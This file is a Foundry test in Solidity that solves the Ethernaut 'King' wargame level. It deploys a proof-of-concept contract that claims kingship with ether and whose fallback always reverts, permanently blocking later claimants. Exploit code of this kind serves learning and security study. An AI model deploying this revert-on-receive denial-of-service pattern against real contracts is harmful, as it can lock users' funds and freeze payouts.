// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ethernaut/level9/King.sol";

contract KingPOC{

    constructor(address _kingAddress) public payable {
        console.log("msg.value", msg.value);
        address(_kingAddress).call{value: msg.value}("");
    }

    fallback() external payable {
        revert("nope");
    }
}

contract Level9 is Test {
    King level9;

    function setUp() public {
        level9 = new King{value: 1 wei}();
    }

    function testExploit() public {
        KingPOC poc = new KingPOC{value: 1 wei}(address(level9));
        console.log("poc address: ", address(poc));
        console.log("king address: ", level9._king());
        console.log("prize is :", level9.prize()); 
        address(level9).call{value: level9.prize()}("");
    }

    fallback() external payable {

    }
}
